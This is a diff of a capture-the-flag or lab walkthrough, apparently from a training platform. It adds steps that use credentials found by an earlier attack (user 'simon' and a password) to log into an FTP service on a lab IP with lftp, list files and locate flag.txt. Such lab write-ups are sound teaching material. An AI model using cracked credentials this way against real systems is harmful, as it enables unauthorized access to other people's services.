@@ -638,3 +638,20 @@ This attack successfully yielded one valid set of credentials:
 
 -Username: simon
 -Password: 8Ns8j1b!23hs4921smHzwn
+
+I then connected to the FTP server using the credentials I found with the following command:
+```bash
+lftp -u simon,'8Ns8j1b!23hs4921smHzwn' 10.129.201.127 -p 2121
+```
+
+Once connected, I listed the directory contents with the ls command:
+
+```bash
+lftp simon@10.129.201.127:~> ls
+`ls' at 0 [FEAT negotiation...]
+-rw-r--r--   1 root     root           29 Apr 20  2022 flag.txt
+drwxrwxr-x   3 simon    simon        4096 Apr 18  2022 Maildir
+```
+I found the file named flag.txt. I then read the file using the cat command.
+
+[![Screenshot-2025-02-28-105324.png](https://i.postimg.cc/BQmPvBV6/Screenshot-2025-02-28-105324.png)](https://postimg.cc/cr8L9wZy)
